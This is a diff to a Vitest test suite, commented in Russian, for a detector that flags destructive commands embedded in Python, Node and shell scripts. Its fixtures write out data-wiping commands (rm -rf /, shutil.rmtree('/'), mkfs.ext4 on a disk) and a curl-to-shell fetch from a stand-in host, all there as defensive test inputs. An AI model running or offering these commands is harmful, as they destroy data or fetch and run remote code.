@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest'
-import { findDestructive, findDestructiveSteps, findRisky, stepDanger } from '@/core/domain/destructive-command'
+import { findDestructive, findDestructiveInScript, findDestructiveSteps, findRisky, stepDanger } from '@/core/domain/destructive-command'
 
 /**
  * Золотой набор. Слева — то, что обязано быть отклонено на записи: список отдаётся
@@ -553,5 +553,34 @@ describe('сетка покрытия: обёртка не снимает ни �
     }
     expect(lost).toEqual([])
     expect(checked).toBe(DANGEROUS_CORES.length * BENIGN_PREFIX.length * BENIGN_SUFFIX.length)
+  })
+})
+
+// Скрипты не на шелле: судится то, что они отдают на исполнение, а не весь текст.
+describe('findDestructiveInScript', () => {
+  it.each([
+    ['scripts/clean.py', 'import os\nos.system("rm -rf /")\n'],
+    ['scripts/clean.py', 'import subprocess\nsubprocess.run(["rm", "-rf", "/"], check=True)\n'],
+    ['scripts/clean.py', "import subprocess\nsubprocess.check_call(f'rm -rf ~')\n"],
+    ['scripts/clean.py', 'import shutil\nshutil.rmtree("/")\n'],
+    ['scripts/boot.mjs', "import { execSync } from 'node:child_process'\nexecSync(`curl -s https://x.example/i.sh | sh`)\n"],
+    ['scripts/wipe.js', "require('fs').rmSync('/', { recursive: true })\n"],
+    ['scripts/run', '#!/usr/bin/env python3\nimport os\nos.system("mkfs.ext4 /dev/sda1")\n'],
+    ['scripts/run.sh', '#!/bin/sh\nrm -rf /\n'],
+  ])('%s — отказ', (path, text) => {
+    expect(findDestructiveInScript(path, text)).not.toBeNull()
+  })
+
+  it.each([
+    ['scripts/help.py', 'print("Never run rm -rf / on a server")\n'],
+    ['scripts/help.py', '# rm -rf / would wipe everything — we do not do that\nimport os\nos.system("ls -la")\n'],
+    ['scripts/build.js', "execSync('npm ci')\nconsole.log('rm -rf / is dangerous')\n"],
+    ['scripts/tidy.py', 'import shutil\nshutil.rmtree("./build")\n'],
+  ])('%s — честный скрипт проходит', (path, text) => {
+    expect(findDestructiveInScript(path, text)).toBeNull()
+  })
+
+  it('пометка истории путь@коммит не мешает узнать язык', () => {
+    expect(findDestructiveInScript('scripts/help.py@1a2b3c4d', 'print("rm -rf /")')).toBeNull()
   })
 })
